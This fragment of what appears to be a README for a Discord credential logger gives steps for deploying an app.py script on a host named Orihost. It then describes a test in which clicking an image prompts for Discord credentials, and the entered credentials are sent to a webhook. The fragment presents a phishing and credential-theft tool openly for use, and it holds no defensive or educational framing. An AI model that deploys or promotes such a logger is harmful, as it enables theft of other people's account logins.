...
1. **Deploy the Project**: Save your changes and deploy the project on Orihost. Ensure that the `app.py` script is set to run on startup.

## Testing

1. **Test the Logger**: Once deployed, you can test the logger by accessing the project URL. Click the image, and it will prompt you to enter your Discord credentials. After entering the credentials, the data will be logged to the specified webhook.
image.jpg
